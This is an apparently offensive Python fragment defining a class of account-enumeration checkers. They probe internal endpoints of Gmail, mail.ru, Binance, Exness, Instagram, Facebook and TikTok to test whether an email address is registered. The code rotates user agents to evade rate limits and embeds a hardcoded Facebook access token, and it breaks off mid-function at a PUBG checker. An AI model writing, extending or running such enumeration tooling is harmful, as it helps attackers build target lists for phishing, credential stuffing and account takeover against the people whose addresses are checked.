class Checkers:
    @staticmethod
    def get_h(m="web"):
        ua = random.choice(BROWSER_DB)
        h = {'User-Agent': ua, 'Accept': '*/*', 'Connection': 'keep-alive'}
        if m == "insta": h.update({'X-IG-App-ID': '936619743392459', 'X-Requested-With': 'XMLHttpRequest'})
        return h

    @staticmethod
    def check_gmail_advanced(email):
        try:
            r = requests.get(f"https://mail.google.com/mail/gxlu?email={email}", headers=Checkers.get_h(), timeout=12)
            if r.status_code == 429: return "BANNED"
            if 'set-cookie' in r.headers:
                if 'COMPASS' not in str(r.headers): return True
            return False
        except: return "ERROR"

    @staticmethod
    def check_mail_ru(email):
        try:
            r = requests.get(f"https://account.mail.ru/api/v1/user/exists?email={email}", headers=Checkers.get_h(), timeout=10)
            return '"exists":false' in r.text
        except: return False

    @staticmethod
    def check_binance(email):
        try:
            r = requests.post("https://www.binance.com/bapi/accounts/v1/public/account/check-email", json={"email": email}, headers=Checkers.get_h(), timeout=8)
            return r.json().get('data') == True
        except: return False

    @staticmethod
    def check_exness(email):
        try:
            r = requests.post("https://my.exness.com/api/external/v1/check-email", json={"email": email}, headers=Checkers.get_h(), timeout=8)
            return r.json().get('exists') == True
        except: return False

    @staticmethod
    def check_instagram(email):
        try:
            r = requests.post("https://www.instagram.com/api/v1/web/accounts/lookup_edit/", headers=Checkers.get_h("insta"), data={'email': email}, timeout=8)
            return '"status":"ok"' in r.text
        except: return False

    @staticmethod
    def check_facebook(email):
        try:
            r = requests.get(f"https://b-graph.facebook.com/recover_accounts?q={email}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32", timeout=8)
            return "network_info" in r.text
        except: return False

    @staticmethod
    def check_tiktok(email):
        try:
            r = requests.get(f"https://www.tiktok.com/api/v1/check/email/?email={email}&aid=1233", timeout=8)
            return r.json().get('is_registered') == 1
        except: return False

    @staticmethod
    def check_pubg(email):
